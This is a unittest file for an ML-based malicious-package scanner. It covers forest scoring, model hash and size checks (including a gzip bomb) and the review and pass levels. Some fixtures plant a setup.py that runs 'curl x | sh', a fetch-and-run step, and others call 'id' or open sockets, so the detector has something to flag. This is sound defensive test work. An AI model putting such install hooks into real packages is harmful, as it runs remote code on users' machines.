"""AegisPilot ML v2 (standard library only): the pure forest, model file checks, the two stages, age at scan time, AES zip,
time limit, the not-installed line (run: python3 tests/test_ml_v2.py).

The pinned-score test needs the released model files (ml-models-v2): it uses AEGIS_ML_TEST_MODELS (a folder with them)
or ~/.aegis/ml/models, and is skipped when neither has files with the SHA-256 of models.json."""
import datetime
import gzip
import hashlib
import io
import json
import math
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
GUARD = ROOT / "guard"
ML = GUARD / "ml"
sys.path.insert(0, str(GUARD))
sys.path.insert(0, str(ML))
import forest  # noqa: E402
import features as F  # noqa: E402
import code_features as CF  # noqa: E402

SPEC = json.loads((ML / "models.json").read_text())


def tree(feature, threshold, p_left, p_right, cover=(10.0, 5.0, 5.0)):
    """One split: x[feature] <= threshold -> left leaf, else right leaf."""
    return {"left": [1, -1, -1], "right": [2, -1, -1], "feature": [feature, -1, -1], "threshold": [threshold, 0.0, 0.0],
            "p1": [(p_left * cover[1] + p_right * cover[2]) / cover[0], p_left, p_right], "cover": list(cover)}


def forest_json(features, trees, alert, review, log_features=()):
    return {"format": forest.FORMAT, "features": list(features), "log_features": list(log_features),
            "thresholds": {"alert": alert, "review": review}, "trees": trees}


def gz(d):
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as g:
        g.write(json.dumps(d).encode())
    return buf.getvalue()


def sdist(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, text in files.items():
            data = text.encode()
            ti = tarfile.TarInfo(f"pkg-1.0/{name}")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


META = {"n_versions": 1, "age_days": 0, "files_latest": 1, "free_email": 1, "email_count": 1, "author_empty": 0,
        "has_wheel": 0, "total_size": 1000, "n_requires": 0, "has_home": 0, "has_license": 0, "n_classifiers": 0,
        "summary_len": 5}


def released_models():
    for d in (os.environ.get("AEGIS_ML_TEST_MODELS"), str(Path.home() / ".aegis" / "ml" / "models")):
        if not d:
            continue
        ok = all((Path(d) / m["file"]).is_file()
                 and hashlib.sha256((Path(d) / m["file"]).read_bytes()).hexdigest() == m["sha256"]
                 for m in SPEC["models"].values())
        if ok:
            return Path(d)
    return None


class PureForest(unittest.TestCase):
    def test_float32_boundary(self):
        # sklearn compares float32(x) with the float64 threshold. Pick a threshold between float32(v) and v.
        v = math.log1p(3.0)                       # log1p(3) is not a float32 number
        v32 = forest.f32(v)
        thr = (v + v32) / 2 if v32 < v else v32 - (v32 - v) / 2
        f = forest.Forest(forest_json(["a"], [tree(0, thr, 0.1, 0.9)], 0.5, 0.5, log_features=["a"]))
        x = f.vector({"a": 3.0})
        self.assertEqual(x[0], v32)
        want = 0.1 if v32 <= thr else 0.9
        self.assertEqual(f.predict(x), want)
        self.assertNotEqual(f.predict([v]), want)                # without the float32 cast the other leaf is taken

    def test_shap_additive(self):
        f = forest.Forest(forest_json(["a", "b"], [tree(0, 0.5, 0.1, 0.9), tree(1, 0.5, 0.2, 0.6, (8.0, 6.0, 2.0))], 0.5, 0.5))
        for x in ([0.0, 0.0], [1.0, 0.0], [1.0, 1.0]):
            base, phi = f.shap(x)
            self.assertAlmostEqual(base + sum(phi), f.predict(x), places=12)

    def test_load_checks_hash_before_parsing(self):
        with tempfile.TemporaryDirectory() as t:
            p = Path(t) / "m.json.gz"
            data = gz(forest_json(["a"], [tree(0, 0.5, 0.1, 0.9)], 0.5, 0.5))
            p.write_bytes(data)
            self.assertEqual(forest.load(p, hashlib.sha256(data).hexdigest()).predict([0.0]), 0.1)
            with self.assertRaises(forest.ModelError):
                forest.load(p, "0" * 64)
            # damaged file whose hash was taken as is: refused as unreadable, not a traceback
            bad = data[:-20]
            p.write_bytes(bad)
            with self.assertRaises(forest.ModelError):
                forest.load(p, hashlib.sha256(bad).hexdigest())
            # not this format
            other = gz({"format": "x", "trees": []})
            p.write_bytes(other)
            with self.assertRaises(forest.ModelError):
                forest.load(p, hashlib.sha256(other).hexdigest())

    def test_size_limits(self):
        with tempfile.TemporaryDirectory() as t:
            p = Path(t) / "m.json.gz"
            p.write_bytes(b"x" * 2048)
            old = forest.MAX_FILE_BYTES
            forest.MAX_FILE_BYTES = 1024
            try:
                with self.assertRaises(forest.ModelError) as e:
                    forest.load(p, hashlib.sha256(b"x" * 2048).hexdigest())
                self.assertIn("larger", str(e.exception))
            finally:
                forest.MAX_FILE_BYTES = old
            bomb = gzip.compress(b" " * (3 << 20))       # 3MB of spaces in a few KB
            p.write_bytes(bomb)
            old = forest.MAX_JSON_BYTES
            forest.MAX_JSON_BYTES = 1 << 20
            try:
                with self.assertRaises(forest.ModelError) as e:
                    forest.load(p, hashlib.sha256(bomb).hexdigest())
                self.assertIn("inflates", str(e.exception))
            finally:
                forest.MAX_JSON_BYTES = old


@unittest.skipUnless(released_models(), "released model files (ml-models-v2) not available: set AEGIS_ML_TEST_MODELS")
class PinnedScores(unittest.TestCase):
    def test_pure_equals_sklearn(self):
        d = released_models()
        fx = json.loads((ROOT / "tests" / "fixtures" / "ml_v2_pinned.json").read_text())
        models = {k: forest.load(d / m["file"], m["sha256"]) for k, m in SPEC["models"].items()}
        self.assertGreaterEqual(len(fx["items"]), 20)
        for it in fx["items"]:
            f = models[it["model"]]
            x = f.vector(it["raw"]) if "raw" in it else [forest.f32(v) for v in it["vector64"]]
            self.assertLess(abs(f.predict(x) - it["sklearn"]), 1e-12, it["name"])


class AgeAtScanTime(unittest.TestCase):
    def proj(self, *times):
        return {"releases": {f"0.{i}": [{"upload_time_iso_8601": t}] for i, t in enumerate(times)}, "info": {}}

    def test_whole_days_from_first_upload(self):
        p = self.proj("2026-11-01T10:00:00Z", "2026-11-03T00:00:00Z")
        at = lambda s: datetime.datetime.fromisoformat(s.replace("Z", "+00:00"))  # noqa: E731
        self.assertEqual(F.age_days(p, at("2026-11-01T10:00:00Z")), 0.0)
        self.assertEqual(F.age_days(p, at("2026-11-02T09:59:59Z")), 0.0)          # 23h59m: still day 0
        self.assertEqual(F.age_days(p, at("2026-11-02T10:00:00Z")), 1.0)
        self.assertEqual(F.age_days(p, at("2026-12-01T12:00:00Z")), 30.0)
        self.assertEqual(F.age_days(p, at("2026-10-01T00:00:00Z")), 0.0)          # clock behind: never negative
        self.assertEqual(F.age_days(p, datetime.datetime(2026, 11, 4, 10, 0)), 3.0)  # naive = UTC

    def test_upload_features_use_now(self):
        f = {"upload_time_iso_8601": "2026-11-01T00:00:00Z", "packagetype": "sdist", "size": 1}
        proj = {"releases": {"1.0": [f]}, "info": {}}
        rel = {"urls": [f], "info": {"author": "a", "author_email": "", "maintainer_email": ""}}
        now = datetime.datetime(2026, 11, 8, 6, tzinfo=datetime.timezone.utc)
        self.assertEqual(F.upload_features(proj, rel, now)["age_days"], 7.0)


class AesZip(unittest.TestCase):
    def aes_zip(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
            z.writestr("pkg/setup.py", "import os\nos.system('id')\n")
        b = bytearray(buf.getvalue())
        # mark the member as AES (method 99) in the local header and the central directory
        i = b.find(b"PK\x03\x04")
        b[i + 8:i + 10] = (99).to_bytes(2, "little")
        j = b.find(b"PK\x01\x02")
        b[j + 10:j + 12] = (99).to_bytes(2, "little")
        return bytes(b)

    def test_aes_zip_is_unreadable_and_goes_to_meta(self):
        with self.assertRaises(CF.UnreadableArchive):
            CF.code_features(self.aes_zip())
        with tempfile.TemporaryDirectory() as t:
            p = Path(t) / "pkg-1.0.zip"
            p.write_bytes(self.aes_zip())
            feats, src = F.code_part(None, str(p))
        self.assertIsNone(feats)
        self.assertIn("UnreadableArchive", src)

    def test_zipcrypto_password_still_read(self):
        # a plain zip is read (the "infected" password only matters for ZipCrypto members)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("pkg/a.py", "x = 1\n")
        self.assertEqual(CF.code_features(buf.getvalue())["n_py"], 1)


class TwoStages(unittest.TestCase):
    """scan.scan with small fake forests: the level rule of ml/scan.py."""

    def setUp(self):
        import scan
        self.scan = scan
        self.saved = dict(scan._cache)
        full_feats = ["n_versions", "age_days", "setup_process", "network_cnt", "n_py"]
        # n_py > 0.5 -> 0.9 (an alert for any package with code); network_cnt > 0.5 raises it a little more
        self.full = forest.Forest(forest_json(full_feats, [tree(4, 0.5, 0.0, 0.9), tree(3, 0.5, 0.85, 0.95)], 0.2352, 0.2352))
        self.tmp = tempfile.TemporaryDirectory()
        self.meta_path = Path(self.tmp.name) / "meta.json"
        self.meta_path.write_text(json.dumps(META))

    def tearDown(self):
        self.scan._cache.clear()
        self.scan._cache.update(self.saved)
        self.tmp.cleanup()

    def run_full(self, files):
        self.scan._cache["full"] = self.full
        art = Path(self.tmp.name) / "pkg-1.0.tar.gz"
        art.write_bytes(sdist(files))
        return self.scan.scan("pkg", "1.0", artifact_path=str(art), meta_path=str(self.meta_path))

    def test_full_severe_is_review(self):
        r = self.run_full({"setup.py": "import os\nos.system('curl x | sh')\n"})
        self.assertTrue(r["alert"])
        self.assertEqual(r["level"], "review")
        self.assertIn("setup_process", [t["feature"] for t in r["reasons"]["code_behavior"]])

    def test_full_other_behavior_with_positive_shap_is_review(self):
        r = self.run_full({"a.py": "def f():\n    import socket\n    socket.socket()\n"})
        self.assertEqual(r["level"], "review")

    def test_full_without_behavior_is_note(self):
        r = self.run_full({"a.py": "x = 1\n"})
        self.assertTrue(r["alert"])
        self.assertEqual(r["level"], "note")
        self.assertEqual(r["reasons"]["code_behavior"], [])

    def test_pass_has_notes_without_contributions(self):
        self.scan._cache["full"] = forest.Forest(forest_json(["n_versions", "setup_process"], [tree(0, 100.0, 0.0, 0.0)], 0.2352, 0.2352))
        art = Path(self.tmp.name) / "pkg-1.0.tar.gz"
        art.write_bytes(sdist({"setup.py": "import os\nos.system('id')\n"}))
        r = self.scan.scan("pkg", "1.0", artifact_path=str(art), meta_path=str(self.meta_path))
        self.assertEqual(r["level"], "pass")
        self.assertEqual([t["feature"] for t in r["notes"]], ["setup_process"])
        self.assertIsNone(r["notes"][0]["contribution"])
        self.assertEqual(r["all_contributions"], [])

    def test_meta_levels(self):
        for p, want in ((0.95, "review"), (0.92, "note"), (0.5, "pass")):
            self.scan._cache["meta"] = forest.Forest(forest_json(["n_versions", "age_days"], [tree(1, 100.0, p, p)], 0.9002, 0.9464,
                                                                 log_features=["n_versions", "age_days"]))
            r = self.scan.scan("pkg", "1.0", meta_path=str(self.meta_path))
            self.assertEqual(r["model"], "ml_meta")
            self.assertEqual(r["level"], want, p)


class Scoring(unittest.TestCase):
    def test_note_never_raises_to_review_and_review_reaches_it(self):
        import rule_engine
        import scan_engine as se
        rs = se.RULESET
        base = {"ok": True, "threshold": 0.2352, "review_threshold": 0.2352, "code_analyzed": True, "reasons": []}
        for score in (0.24, 0.5, 0.99):
            note = rule_engine.ml_subscore_level(rs, {**base, "ml_score": score, "level": "note"})
            self.assertLess(rs.ml_weight * note, rs.review_threshold)
            rev = rule_engine.ml_subscore_level(rs, {**base, "ml_score": score, "level": "review"})
            self.assertGreaterEqual(rs.ml_weight * rev, rs.review_threshold)
            self.assertLess(rs.ml_weight * rev, rs.block_threshold)            # ML alone never blocks
        # the rounded score just under the review threshold still counts as review by its level
        rev = rule_engine.ml_subscore_level(rs, {**base, "ml_score": 0.235, "ml_score_exact": 0.23525, "level": "review"})
        self.assertGreaterEqual(rs.ml_weight * rev, rs.review_threshold)
        self.assertTrue(rule_engine.ml_reasons({**base, "ml_score": 0.5, "level": "review"})[0].startswith("[ML review]"))
        self.assertTrue(rule_engine.ml_reasons({**base, "ml_score": 0.5, "level": "note"})[0].startswith("[ML note]"))

    def test_verdicts(self):
        import scan_engine as se
        f = se.ScanFeatures(name="x", version="1")
        f.ml = {"ok": True, "ml_score": 0.6, "ml_score_exact": 0.6, "threshold": 0.2352, "review_threshold": 0.2352,
                "alert": True, "level": "note", "code_analyzed": True, "reasons": [], "notes": []}
        self.assertEqual(se.Verdict(*se.rule_engine.score_ml(se.RULESET, f), f).verdict, "ALLOW")
        f.ml["level"] = "review"
        self.assertEqual(se.Verdict(*se.rule_engine.score_ml(se.RULESET, f), f).verdict, "NEEDS_HUMAN_REVIEW")


class BridgeAndDisplay(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.env = dict(os.environ)
        os.environ["AEGIS_ML_DIR"] = str(Path(self.tmp.name) / "ml")
        os.environ.pop("AEGIS_ML", None)
        import ml_bridge
        import ml_install
        self.b, self.i = ml_bridge, ml_install
        self.spec = ml_install.spec

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.env)
        self.i.spec = self.spec
        self.tmp.cleanup()

    def test_not_installed_line(self):
        r = self.b.ml_predict("requests")
        self.assertFalse(r["ok"])
        self.assertTrue(r.get("not_installed"))
        import review_report
        from output import render

        class Feat:
            ml = r
        fields = review_report._ml_fields(Feat())
        self.assertEqual(fields["ml_status"], "not_installed")
        self.assertEqual(render.ml_line(fields), "ML detection off — run python3 guard_cli.py ml-install to turn it on (a few seconds)")
        os.environ["AEGIS_ML"] = "0"
        r = self.b.ml_predict("requests")
        self.assertTrue(r.get("disabled"))
        self.assertEqual(render.ml_line(review_report._ml_fields(type("F", (), {"ml": r})())), "N/A (disabled: AEGIS_ML=0)")

    def test_level_lines(self):
        from output import render
        base = {"ml_status": "ok", "ml_score": 0.41, "ml_threshold": 0.2352, "ml_review_threshold": 0.2352, "ml_model": "ml_full"}
        self.assertIn("REVIEW — risk detected (ML)", render.ml_line({**base, "ml_level": "review"}))
        self.assertIn("note", render.ml_line({**base, "ml_level": "note"}))
        self.assertEqual(render.ml_why_line({**base, "ml_level": "note", "ml_why": ["no homepage"]}), "[ML note] no homepage")
        self.assertEqual(render.ml_why_line({**base, "ml_level": "review", "ml_why": ["a", "b"]}), "[ML review] a / b")

    def fake_install(self, data_by_kind):
        models = {}
        d = Path(os.environ["AEGIS_ML_DIR"]) / "models"
        d.mkdir(parents=True)
        for k, data in data_by_kind.items():
            (d / f"{k}.json.gz").write_bytes(data)
            models[k] = {"file": f"{k}.json.gz", "size": len(data), "sha256": hashlib.sha256(data).hexdigest()}
        fake = {"release_url": "https://example.invalid/", "models": models}
        self.i.spec = lambda: fake
        return d, fake

    def test_timeout_is_no_verdict(self):
        self.fake_install({"full": b"a", "meta": b"b"})
        real = self.b.subprocess.run

        def slow(*a, **k):
            raise subprocess.TimeoutExpired(a[0], k.get("timeout"))
        self.b.subprocess.run = slow
        try:
            r = self.b.ml_predict("pkg", "1.0")
        finally:
            self.b.subprocess.run = real
        self.assertEqual(r, {"ok": False, "error": "exceeded 45s"})

    def test_subprocess_end_to_end_and_hash_refusal(self):
        """scan.py as the guard runs it (python3 -I, the guard's interpreter), from a copy of guard/ml with a fake
        models.json: a run, then a changed model file refused by scan.py itself."""
        full = forest_json(["n_versions", "age_days", "setup_process", "n_py"], [tree(3, 0.5, 0.0, 0.9)], 0.2352, 0.2352,
                           log_features=["n_versions", "age_days", "n_py"])
        meta = forest_json(["n_versions", "age_days"], [tree(1, 100.0, 0.1, 0.1)], 0.9002, 0.9464)
        code = Path(self.tmp.name) / "code"
        shutil.copytree(ML, code, ignore=shutil.ignore_patterns("__pycache__", "models.json"))
        d, fake = self.fake_install({"full": gz(full), "meta": gz(meta)})
        (code / "models.json").write_text(json.dumps(fake))
        art = Path(self.tmp.name) / "pkg-1.0.tar.gz"
        art.write_bytes(sdist({"setup.py": "import os\nos.system('curl x | sh')\n"}))
        mp = Path(self.tmp.name) / "meta.json"
        mp.write_text(json.dumps(META))
        cmd = [sys.executable, "-I", str(code / "scan.py"), "pkg", "1.0", "--artifact", str(art), "--meta", str(mp),
               "--models", str(d), "--json"]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=self.tmp.name)
        r = json.loads(p.stdout)
        self.assertEqual((r["model"], r["level"]), ("ml_full", "review"), p.stderr)
        (d / "full.json.gz").write_bytes(gz({**full, "thresholds": {"alert": 0.99, "review": 0.99}}))
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=self.tmp.name)
        self.assertEqual(p.returncode, 1)
        self.assertIn("SHA-256", json.loads(p.stdout)["error"])

    def test_no_third_party_imports(self):
        """The runtime modules import the standard library only."""
        allowed = set(sys.stdlib_module_names) | {"forest", "features", "code_features", "scan"}
        import ast
        for name in ("forest.py", "features.py", "code_features.py", "scan.py"):
            tree_ = ast.parse((ML / name).read_text())
            for node in ast.walk(tree_):
                mods = [a.name for a in node.names] if isinstance(node, ast.Import) else \
                    [node.module] if isinstance(node, ast.ImportFrom) and node.module else []
                for m in mods:
                    self.assertIn(m.split(".")[0], allowed, f"{name}: {m}")


if __name__ == "__main__":
    unittest.main()
